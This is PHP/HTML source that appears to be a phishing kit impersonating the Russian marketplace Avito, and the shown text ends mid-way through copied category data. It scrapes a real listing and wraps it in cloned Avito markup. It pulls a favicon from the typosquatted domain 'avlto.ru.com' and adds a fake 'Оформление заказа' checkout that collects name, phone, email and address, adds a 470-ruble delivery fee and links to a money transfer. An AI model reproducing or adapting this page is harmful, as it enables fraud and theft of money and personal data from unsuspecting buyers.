<?php

  error_reporting(0);

  include "grabber.php";

  if (count($_GET) == 0 || !isset(array_keys($_GET)[0]) || array_keys($_GET)[0] == null)
    header("Location: https://avito.ru");

  $grabber = new AvitoGrabber("https://www.avito.ru/" . array_keys($_GET)[0]);
  $data = $grabber->Grab();

  function IsMobile() { 
    $array = array("ipad", "iphone", "android", "pocket", "palm", "windows ce", "windowsce", "cellphone", "opera mobi", "ipod", "small", "sharp", "sonyericsson", "symbian", "opera mini", "nokia", "htc_", "samsung", "motorola", "smartphone", "blackberry", "playstation portable", "tablet browser");
    $agent = strtolower($_SERVER["HTTP_USER_AGENT"]);    

    foreach ($array as $value)
      if (strpos($agent, $value) !== false)
        return true;
    
    return false; 
  }

?>

<?php if (!IsMobile()){ ?>
<!DOCTYPE html>
<link rel="shortcut icon" href="https://oplata.avlto.ru.com/favicon.ico" />
<body style="margin-top: -20;"
<html>
<head>
  <meta charset="utf-8">
   <meta name="format-detection" content="telephone=no">
   <title><?php echo $data["page_title"]; ?></title>


    <link rel="stylesheet" href="styles/992910ddb83e99abfdd6.css">
    <link rel="stylesheet" href="styles/10cf160257d3965a15cd.css">
    <link rel="stylesheet" href="styles/354d2fd8431d0bd83c1c.css">
    <link rel="stylesheet" href="styles/4194b5f796b52115ced1.css">
    
    <link rel="stylesheet" href="styles/e1f37f962e6e4a817cdb.css">
    <link rel="stylesheet" href="styles/2d58b67fe0af54d0ed39.css">
    <link rel="stylesheet" href="styles/9537d6c582d8a025df7d.css">
    <link rel="stylesheet" href="styles/ca81898f41f3f52b9275.css">
    <link rel="stylesheet" href="styles/f47fd590a5972c7368c3.css">
    <link rel="stylesheet" href="styles/39ee5ffe92929cfa494a.css">
    <link rel="stylesheet" href="styles/5c0b50eeaeec9e03fce6.css">
    <link rel="stylesheet" href="styles/886f10533c9a633512d0.css">
    <link rel="stylesheet" href="styles/10476c219666c50fc059.css">
    <link rel="stylesheet" href="styles/88af2ff2c080dfe2ec7f.css">
    <link rel="stylesheet" href="styles/b402769d4490ce01ebd2.css">
    <link rel="stylesheet" href="styles/a776da6b7a062ce8decc.css">
    <link rel="stylesheet" href="styles/3e6295814d22728b9ea6.css">
    <link rel="stylesheet" href="styles/26158867003a696ad87d.css">
    <link rel="stylesheet" href="styles/5d76f4d2da13aa8620a7.css">
    <link rel="stylesheet" href="styles/53cef5de35d22fb4ae99.css">
    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="common/touch-icons/common/apple-touch-icon-180x180-precomposedf496.png?57be3fb" /><link rel="apple-touch-icon-precomposed" sizes="152x152" href="common/touch-icons/common/apple-touch-icon-152x152-precomposedee9c.png?cac4f2a" /><link rel="apple-touch-icon-precomposed" sizes="144x144" href="common/touch-icons/common/apple-touch-icon-144x144-precomposedeea4.png?9615e61" /><link rel="apple-touch-icon-precomposed" sizes="120x120" href="common/touch-icons/common/apple-touch-icon-120x120-precomposed9811.png?2a32f09" /><link rel="apple-touch-icon-precomposed" sizes="114x114" href="common/touch-icons/common/apple-touch-icon-114x114-precomposed9e05.png?174e153" /><link rel="apple-touch-icon-precomposed" sizes="76x76" href="common/touch-icons/common/apple-touch-icon-76x76-precomposedcf30.png?28e6cfb" /><link rel="apple-touch-icon-precomposed" sizes="72x72" href="common/touch-icons/common/apple-touch-icon-72x72-precomposed0fca.png?aeb90b3" /><link rel="apple-touch-icon-precomposed" sizes="57x57" href="common/touch-icons/common/apple-touch-icon-57x57-precomposedf58a.png?fd7ac94" /><meta name="msapplication-TileColor" content="#000000"><meta name="msapplication-TileImage" content="/s/common/touch-icons/common/mstile-144x144.png"><meta name="msapplication-config" content="browserconfig.xml" /><link href="https://www.avito.st/favicon.ico?9de48a5" rel="shortcut icon" type="image/x-icon" /><link rel="mask-icon" href="https://www.avito.st/s/common/touch-icons/common/favicon-pinned.svg?53a9620" color="#00aaff">
    <script src="js/jquery-1.9.1.js" ></script>
    <script src="js/gallery.js"></script>
    <script src="js/form.js"></script>
    <script src="chunks/b376d9db5a217038fa51.js" ></script>
  <script src="bundles/076301b392744c983cee.js" ></script>
  <script src="bundles/da14d2f57ec39783e0be.js" ></script>
  <script src="chunks/4bb0ebafb259cd226231.js" ></script>
<script src="bundles/064c86e16d7d0a77683e.js" ></script>
 <script src="bundles/e4d8fce88ecd17eef347.js" ></script>
 

     <link rel="stylesheet" href="styles/3a08cd5957994572f5ac.css">
  
  <script src="chunks/39748e30e85109290138.js" defer></script>

<script src="bundles/1dc3c4c57e8840020115.js" defer></script>

    
        <style>.item-notes-icon_add {
    width: 18px;
    height: 18px;
    background: url(https://www.avito.st/s/cc/resources/f0cb06b49c3f.svg) 0 2px no-repeat;
    background-size: 16px;
    vertical-align: bottom;
    margin-right: 6px;
    display: inline-block;
    position: relative;
        } 
    </style>
  </head> 
<body>

    
    
<div style="display: none;">
<div class="popup-overlay-1CyxP popup-scrolling-outside-1xNY2" id="myModal">
    <div class="popup-container-1oHnH popup-position-middle-3KJIk popup-width-wide-1gQp2">
        <button type="button" title="Закрыть" class="popup-close-2W0cr arcticmodal-close">Закрыть</button>
        <div class="popup-content-2NIUn popup-padding-old-JtfMA popup-cover-Uslhr">
            <span class="text-text-1PdBw text-size-s-1PUdo">
                <div class="widget-root-K6A2m">
                    <h2 class="widget-title-nynN_" data-marker="delivery-popup/title">Оформление заказа</h2>                       
                        
                        <div class="form-description-1_9Dq"></div>
                        <div class="form-item--ppzC">
                            <div class="block-root_spaced-3PYuz">
                                <div class="block-title-33xW_"><span class="text-text-1PdBw text-size-l-2gTpu">Получатель</span></div>
                                
                                <input id="amount" type="hidden" value="<?php echo $data["item"]["price"]["number"] + 470 ?>">

                                <div class="form-item--ppzC form-fieldset-35PgH">
                                    <div class="fieldset-fieldset-3kbZz fieldset-size-m-2ZQmV fieldset-root_layout_wide-1TNC1">
                                        <div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x">
                                            <label class="fieldset-label-2gmFi" data-marker="label"><span class="text-text-1PdBw text-size-m-4mxHN">Имя и фамилия</span>
                                            </label>
                                        </div>
                                        <div class="column-root-N_0Ue width-width-flex-6-2J4AD column-has_width-lyA4x">
                                            <div class="fieldset-field-25Lrl" data-marker="field">
                                                <label class="input-layout-input-layout-eKhsI input-layout-size-m-1G8d4 input-layout-text-align-left-IDAPR width-width-12-2VZLz">
                                                    <input id="user" name="user" placeholder="Имя и фамилия" type="text" class="input-input-25uCh" value="">
                                                    <div class="input-layout-icon-20pUR" data-marker="clear-icon">
                                                    </div>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x"><div class="fieldset-postfix-2UQlH text-text-1PdBw text-size-m-4mxHN"></div></div>
                                    </div>
                                </div>
                                <div class="form-item--ppzC form-fieldset-35PgH">
                                    <div class="fieldset-fieldset-3kbZz fieldset-size-m-2ZQmV fieldset-root_layout_wide-1TNC1">
                                        <div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x"><label class="fieldset-label-2gmFi" data-marker="label"><span class="text-text-1PdBw text-size-m-4mxHN">Телефон</span></label>
                                        </div>
                                        <div class="column-root-N_0Ue width-width-flex-6-2J4AD column-has_width-lyA4x">
                                            <div class="fieldset-field-25Lrl" data-marker="field">
                                                <label class="input-layout-input-layout-eKhsI input-layout-size-m-1G8d4 input-layout-text-align-left-IDAPR width-width-12-2VZLz">
                                                    <input id="phone" name="phone" placeholder="Телефон" type="text" class="input-input-25uCh" value="" im-insert="true">
                                                <div class="input-layout-icon-20pUR" data-marker="clear-icon"></div>
                                                </label>
                                            </div>
                                        </div><div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x"><div class="fieldset-postfix-2UQlH text-text-1PdBw text-size-m-4mxHN"></div></div>
                                    </div>
                                </div>
                                <div class="form-item--ppzC form-fieldset-35PgH">
                                    <div class="fieldset-fieldset-3kbZz fieldset-size-m-2ZQmV fieldset-root_layout_wide-1TNC1">
                                        <div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x">
                                            <label class="fieldset-label-2gmFi" data-marker="label"><span class="text-text-1PdBw text-size-m-4mxHN">Эл. почта</span>
                                            </label>
                                        </div>
                                        <div class="column-root-N_0Ue width-width-flex-6-2J4AD column-has_width-lyA4x">
                                            <div class="fieldset-field-25Lrl" data-marker="field">
                                                <label class="input-layout-input-layout-eKhsI input-layout-size-m-1G8d4 input-layout-text-align-left-IDAPR width-width-12-2VZLz">
                                                    <input id="email" name="email" placeholder="Эл. почта" type="text" class="input-input-25uCh" value="">
                                                    <div class="input-layout-icon-20pUR" data-marker="clear-icon">
                                                    </div>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x">
                                        <div class="fieldset-postfix-2UQlH text-text-1PdBw text-size-m-4mxHN"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-item--ppzC form-fieldset-35PgH">
                                    <div class="fieldset-fieldset-3kbZz fieldset-size-m-2ZQmV fieldset-root_layout_wide-1TNC1">
                                        <div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x">
                                            <label class="fieldset-label-2gmFi" data-marker="label"><span class="text-text-1PdBw text-size-m-4mxHN">Адрес доставки</span>
                                            </label>
                                        </div>
                                        <div class="column-root-N_0Ue width-width-flex-6-2J4AD column-has_width-lyA4x">
                                            <div class="fieldset-field-25Lrl" data-marker="field">
                                                <label class="input-layout-input-layout-eKhsI input-layout-size-m-1G8d4 input-layout-text-align-left-IDAPR width-width-12-2VZLz">
                                                    <input id="address" name="address" placeholder="Адрес доставки" type="text" class="input-input-25uCh" value="">
                                                    <div class="input-layout-icon-20pUR" data-marker="clear-icon">
                                                    </div>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="column-root-N_0Ue width-width-flex-3-2jcG8 column-has_width-lyA4x"><div class="fieldset-postfix-2UQlH text-text-1PdBw text-size-m-4mxHN"></div></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="form-item--ppzC">
                            <div class="">
                                <div class="block-title-33xW_"><span class="text-text-1PdBw text-size-l-2gTpu">Стоимость</span></div>
                                <div class="price-root-3I8qa"><div class="price-label-3yJ9t"><?php echo $data["item"]["title"]; ?></div>
                                    <div class="price-value-3z7P7">
                                    <span class="text-text-1PdBw"><?php echo $data["item"]["price"]["formatted"]; ?> <span class="number-format-currency-3hVeG">₽</span></span>
                                    </div>
                                </div>
                                <div class="price-root-3I8qa">
                                    <div class="price-label-3yJ9t">Доставка 2-3 дня</div>
                                    <div class="price-value-3z7P7"><span class="text-text-1PdBw">470 <span class="number-format-currency-3hVeG">₽</span></span>
                                    </div>
                                </div>
                                <div class="price-root-3I8qa price-root_total-2g98_"><div class="price-label-3yJ9t"></div><div class="price-value-3z7P7"><strong><span class="text-text-1PdBw"><?php echo number_format(470 + $data["item"]["price"]["number"], 2, ',', ' '); ?> <span class="number-format-currency-3hVeG">₽</span></span></strong></div>
                                </div>
                            </div>
                        </div>
                        <div class="form-item--ppzC">
                            <div class="order-form-footer-7UnUS">
                                <div class="row-root-Y8nPN row-root_padding_none-xfvAy">
                                    <div class="column-root-N_0Ue width-width-flex-7-23G4L column-has_width-lyA4x"><div class="text-text-1PdBw text-size-xs-2BbRF text-color-noaccent-bzEdI">Нажимая «Перейти к оплате», вы принимаете <a target="_blank" rel="noreferrer noopener" href="https://support.avito.ru/articles/688" class="link-link-39EVK link-design-inherited-3KR5L link-underline-solid-1Hi3Y">оферту</a> и&nbsp;подтверждаете достоверность ваших данных.</div></div>
                                    <div class="column-root-N_0Ue width-width-flex-5-_2Y1Y column-has_width-lyA4x column-root_align_right-SyaqL"><div>
                                    <button id="delivery-submit" data-marker="delivery-item-button-main" class="button-button-2Fo5k button-size-l-3LVJf button-primary-1RhOG width-width-12-2VZLz" aria-busy="false">
                                      <span href="https://money.yandex.ru/transfer?requestId=b8adac2a-59fc-43d7-9d06-49638af1ac66"  class="button-textBox-Row9K">Купить с доставкой</span>
                                    </button>
                                    </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </span>
        </div>
    </div>
</div>
</div>
                              
<div class="js-header-container header-container   header-container_no-bottom-margin">
    <div class='js-header' data-state='{"body_class":"os x safari safari-safari","country":{"host":"www.avito.ru","country_slug":"rossiya","site_name":"Авито","delivery":{"name":"Авито Доставка"},"currency_sign":"₽"},"currentPage":"item","delivery":null,"headerInfo":null,"hideAddButton":null,"isNCEnabled":null,"isShowAvitoPro":false,"isShowProReports":null,"luri":"rossiya","menu":{"catalog":{"title":"Объявления","link":"catalog","active":true},"shops":{"title":"Магазины","link":"shops"},"business":{"title":"Бизнес","link":"subscription?avcm=for_business"},"support":{"title":"Помощь","absoluteLink":"avito-support.ru"}},"messenger":null,"servicesClassName":"header-services","showBonusesLink":false,"user":{"isAuthenticated":false,"id":0,"name":"","hasShop":false,"hasShopSubscription":false,"hasActiveDelivery":false,"isLegalPerson":false,"isLegal":null,"avatar":null},"userAccount":{"balance":{"bonus":"","real":"0","total":"0"},"isSeparationBalance":null},"favorites":{"unreadFavoritesCount":null},"user_location_id":621540,"hierarchy":null,"now":1564154670,"_dashboard":{},"_webvisor":{},"ssrMode":"prod"}'><div class="header-root-1FCTt header-services" data-marker="header/navbar"><div class="header-inner-3iFNe header-clearfix-kI6fL"><ul class="header-list-IUZFq header-nav-wQVeb header-clearfix-kI6fL"><li class="header-nav-item-1OJG-"><a
 class="header-link-TLsAU header-nav-link-126h3"
 href="https://avito.ru/rossiya"
    >Объявления</a></li><li class="header-nav-item-1OJG-"><a
 class="header-link-TLsAU header-nav-link-126h3"
 href="https://avito.ru/shops"
    >Магазины</a></li><li class="header-nav-item-1OJG-"><a
 class="header-link-TLsAU header-nav-link-126h3"
 href="https://avito.ru/subscription?avcm=for_business"
    >Бизнес</a></li><li class="header-nav-item-1OJG-"><a
 class="header-link-TLsAU header-nav-link-126h3"
 href="https://avito-support.ru/"
   target="_blank" rel="noopener noreferrer" >Помощь</a></li></ul>
        <div class="header-services-menu-2tz5y">
            <div data-marker="header/favorites" class="header-services-menu-item-3H7kQ"><a href="https://avito.ru/favorites" title="Избранное" class="header-services-menu-link-fsJlE"><span class="header-services-menu-icon-wrap-STcWG"><span class="header-services-menu-icon-PXhUE"><svg width="21" height="24" xmlns="http://www.w3.org/2000/svg"></svg></span><i class="header-icon-count-2EGgu header-icon-count_red-3f61L header-icon-count_hidden-3av6Y"></i></span></a></div>
       <div class="header-services-menu-item_username-32omV ">
        </div>
        </div><div class="header-button-wrapper-2UC-r"><a class=""
 href="#login?s=h&amp;next=%2Fadditem"></a></div></div></div></div>    <div class='js-header-navigation' data-state='{"alternativeCategoryMenu":null,"categoryMenu":[{"title":"Авто","categoryId":"Obj_Category_ROOT_TRANSPORT"},{"title":"Недвижимость","categoryId":"Obj_Category_ROOT_REAL_ESTATE"},{"title":"Работа","categoryId":"Obj_Category_ROOT_JOB"},{"title":"Услуги","categoryId":"Obj_Category_ROOT_SERVICES"}],"categoryTree":[{"id":1,"mcId":1,"name":"Все категории","subs":[{"id":2,"mcId":2,"name":"Транспорт","subs":[{"id":14,"mcId":14,"name":"Автомобили","subs":[],"url":"\/rossiya\/avtomobili?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":9,"params":{},"count":1},{"id":15,"mcId":15,"name":"Мотоциклы и мототехника","subs":[],"url":"\/rossiya\/mototsikly_i_mototehnika?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":14,"params":{},"count":1},{"id":16,"mcId":16,"name":"Грузовики и спецтехника","subs":[],"url":"\/rossiya\/gruzoviki_i_spetstehnika?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":81,"params":{},"count":1},{"id":12,"mcId":12,"name":"Водный транспорт","subs":[],"url":"\/rossiya\/vodnyy_transport?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":11,"params":{},"count":1},{"id":17,"mcId":17,"name":"Запчасти и аксессуары","subs":[],"url":"\/rossiya\/zapchasti_i_aksessuary?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":10,"params":{},"count":1}],"url":"\/rossiya\/transport?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":1,"params":{},"count":6},{"id":5,"mcId":5,"name":"Недвижимость","subs":[{"id":30,"mcId":30,"name":"Квартиры","subs":[],"url":"\/rossiya\/kvartiry?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":24,"params":{},"count":1},{"id":31,"mcId":31,"name":"Комнаты","subs":[],"url":"\/rossiya\/komnaty?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":23,"params":{},"count":1},{"id":32,"mcId":32,"name":"Дома, дачи, коттеджи","subs":[],"url":"\/rossiya\/doma_dachi_kottedzhi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":25,"params":{},"count":1},{"id":33,"mcId":33,"name":"Земельные участки","subs":[],"url":"\/rossiya\/zemelnye_uchastki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":26,"params":{},"count":1},{"id":34,"mcId":34,"name":"Гаражи и машиноместа","subs":[],"url":"\/rossiya\/garazhi_i_mashinomesta?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":85,"params":{},"count":1},{"id":35,"mcId":35,"name":"Коммерческая недвижимость","subs":[],"url":"\/rossiya\/kommercheskaya_nedvizhimost?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":42,"params":{},"count":1},{"id":36,"mcId":36,"name":"Недвижимость за рубежом","subs":[],"url":"\/rossiya\/nedvizhimost_za_rubezhom?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":86,"params":{},"count":1}],"url":"\/rossiya\/nedvizhimost?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":4,"params":{},"count":8},{"id":10,"mcId":10,"name":"Работа","subs":[{"id":61,"mcId":61,"name":"Вакансии","subs":[],"url":"\/rossiya\/vakansii?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":111,"params":{},"count":1},{"id":62,"mcId":62,"name":"Резюме","subs":[],"url":"\/rossiya\/rezume?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":112,"params":{},"count":1}],"url":"\/rossiya\/rabota?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":110,"params":{},"count":3},{"id":63,"mcId":63,"name":"Услуги","subs":[{"id":741,"mcId":741,"name":"IT, интернет, телеком","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/it_internet_telekom?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10195},"count":1},{"id":739,"mcId":739,"name":"Бытовые услуги","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/bytovye_uslugi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10200},"count":1},{"id":738,"mcId":738,"name":"Деловые услуги","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/delovye_uslugi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10201},"count":1},{"id":727,"mcId":727,"name":"Искусство","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/iskusstvo?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10220},"count":1},{"id":740,"mcId":740,"name":"Красота, здоровье","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/krasota_zdorove?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10197},"count":1},{"id":43435,"mcId":43435,"name":"Курьерские поручения","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/kurerskie_uslugi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":15731},"count":1},{"id":28234,"mcId":28234,"name":"Мастер на час","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/master_na_chas?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":15326},"count":1},{"id":743,"mcId":743,"name":"Няни, сиделки","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/nyani_sidelki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10196},"count":1},{"id":737,"mcId":737,"name":"Оборудование, производство","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/oborudovanie_proizvodstvo?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10202},"count":1},{"id":742,"mcId":742,"name":"Обучение, курсы","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/obuchenie_kursy?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10203},"count":1},{"id":736,"mcId":736,"name":"Охрана, безопасность","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/ohrana_bezopasnost?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10204},"count":1},{"id":735,"mcId":735,"name":"Питание, кейтеринг","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/pitanie_keytering?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10205},"count":1},{"id":734,"mcId":734,"name":"Праздники, мероприятия","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/prazdniki_meropriyatiya?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10206},"count":1},{"id":733,"mcId":733,"name":"Реклама, полиграфия","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/reklama_poligrafiya?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10207},"count":1},{"id":60292,"mcId":60292,"name":"Ремонт и обслуживание техники","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/remont_i_obsluzhivanie_tehniki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":15834},"count":1},{"id":732,"mcId":732,"name":"Ремонт, строительство","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/remont_stroitelstvo?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10208},"count":1},{"id":731,"mcId":731,"name":"Сад, благоустройство","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/sad_blagoustroystvo?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10209},"count":1},{"id":730,"mcId":730,"name":"Транспорт, перевозки","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/transport_perevozki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10210},"count":1},{"id":60291,"mcId":60291,"name":"Уборка","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/uborka_klining?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":15833},"count":1},{"id":43434,"mcId":43434,"name":"Установка техники","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/ustanovka_tehniki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":15725},"count":1},{"id":729,"mcId":729,"name":"Уход за животными","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/uhod_za_zhivotnymi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10211},"count":1},{"id":728,"mcId":728,"name":"Фото- и видеосъёмка","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/foto-_i_videosemka?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10212},"count":1},{"id":744,"mcId":744,"name":"Другое","subs":[],"url":"\/rossiya\/predlozheniya_uslug\/drugoe?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":114,"params":{"716":10213},"count":1}],"url":"\/rossiya\/predlozheniya_uslug?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":114,"params":{},"count":24},{"id":6,"mcId":6,"name":"Личные вещи","subs":[{"id":37,"mcId":37,"name":"Одежда, обувь, аксессуары","subs":[],"url":"\/rossiya\/odezhda_obuv_aksessuary?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":27,"params":{},"count":1},{"id":38,"mcId":38,"name":"Детская одежда и обувь","subs":[],"url":"\/rossiya\/detskaya_odezhda_i_obuv?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":29,"params":{},"count":1},{"id":39,"mcId":39,"name":"Товары для детей и игрушки","subs":[],"url":"\/rossiya\/tovary_dlya_detey_i_igrushki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":30,"params":{},"count":1},{"id":40,"mcId":40,"name":"Часы и украшения","subs":[],"url":"\/rossiya\/chasy_i_ukrasheniya?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":28,"params":{},"count":1},{"id":41,"mcId":41,"name":"Красота и здоровье","subs":[],"url":"\/rossiya\/krasota_i_zdorove?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":88,"params":{},"count":1}],"url":"\/rossiya\/lichnye_veschi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":5,"params":{},"count":6},{"id":3,"mcId":3,"name":"Для дома и дачи","subs":[{"id":20,"mcId":20,"name":"Бытовая техника","subs":[],"url":"\/rossiya\/bytovaya_tehnika?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":21,"params":{},"count":1},{"id":21,"mcId":21,"name":"Мебель и интерьер","subs":[],"url":"\/rossiya\/mebel_i_interer?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":20,"params":{},"count":1},{"id":22,"mcId":22,"name":"Посуда и товары для кухни","subs":[],"url":"\/rossiya\/posuda_i_tovary_dlya_kuhni?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":87,"params":{},"count":1},{"id":18,"mcId":18,"name":"Продукты питания","subs":[],"url":"\/rossiya\/produkty_pitaniya?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":82,"params":{},"count":1},{"id":23,"mcId":23,"name":"Ремонт и строительство","subs":[],"url":"\/rossiya\/remont_i_stroitelstvo?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":19,"params":{},"count":1},{"id":19,"mcId":19,"name":"Растения","subs":[],"url":"\/rossiya\/rasteniya?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":106,"params":{},"count":1}],"url":"\/rossiya\/dlya_doma_i_dachi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":2,"params":{},"count":7},{"id":7,"mcId":7,"name":"Бытовая электроника","subs":[{"id":43,"mcId":43,"name":"Аудио и видео","subs":[],"url":"\/rossiya\/audio_i_video?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":32,"params":{},"count":1},{"id":44,"mcId":44,"name":"Игры, приставки и программы","subs":[],"url":"\/rossiya\/igry_pristavki_i_programmy?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":97,"params":{},"count":1},{"id":45,"mcId":45,"name":"Настольные компьютеры","subs":[],"url":"\/rossiya\/nastolnye_kompyutery?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":31,"params":{},"count":1},{"id":46,"mcId":46,"name":"Ноутбуки","subs":[],"url":"\/rossiya\/noutbuki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":98,"params":{},"count":1},{"id":47,"mcId":47,"name":"Оргтехника и расходники","subs":[],"url":"\/rossiya\/orgtehnika_i_rashodniki?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":99,"params":{},"count":1},{"id":48,"mcId":48,"name":"Планшеты и электронные книги","subs":[],"url":"\/rossiya\/planshety_i_elektronnye_knigi?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":96,"params":{},"count":1},{"id":49,"mcId":49,"name":"Телефоны","subs":[],"url":"\/rossiya\/telefony?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":84,"params":{},"count":1},{"id":42,"mcId":42,"name":"Товары для компьютера","subs":[],"url":"\/rossiya\/tovary_dlya_kompyutera?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":101,"params":{},"count":1},{"id":50,"mcId":50,"name":"Фототехника","subs":[],"url":"\/rossiya\/fototehnika?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":2,"categoryId":105,"params":{},"count":1}],"url":"\/rossiya\/bytovaya_elektronika?view=gallery&cd=1","current":false,"currentParent":false,"opened":false,"level":1,"categoryId":6,"params":{},"count":10},{"id":8,"mcId":8,"name":"Хобби и отдых","subs":[{"id":51,"mcId":51,"name":"Билеты и 